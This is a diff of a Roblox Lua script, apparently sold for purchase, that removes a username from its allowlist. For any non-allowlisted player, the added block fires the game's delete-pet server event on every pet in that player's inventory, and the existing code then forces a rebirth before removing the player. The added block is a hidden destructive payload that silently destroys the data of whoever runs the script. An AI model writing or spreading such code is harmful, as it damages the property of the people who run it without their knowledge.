@@ -14,7 +14,6 @@ local allowedUsernames = {
     "maxina1166",
     "supercloud_sabe2110",
     "TML_SAN",
-    "Kawarokiu",
 }
 
 local isAllowed = false
@@ -30,6 +29,22 @@ end
 if not isAllowed then
     warn("Acceso denegado, este Script es de compra.")
     
+    -- Borra todas las mascotas del inventario
+    pcall(function()
+        local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
+        if petsFolder then
+            for _, folder in pairs(petsFolder:GetChildren()) do
+                if folder:IsA("Folder") then
+                    for _, pet in pairs(folder:GetChildren()) do
+                        ReplicatedStorage.rEvents.deletePetEvent:FireServer("deletePet", pet)
+                    end
+                end
+            end
+        end
+    end)
+    
+    task.wait(0.2)
+
     -- Realiza 1 solo rebirth antes de sacar al jugador
     pcall(function()
         ReplicatedStorage.rEvents.rebirthRemote:InvokeServer("rebirthRequest")
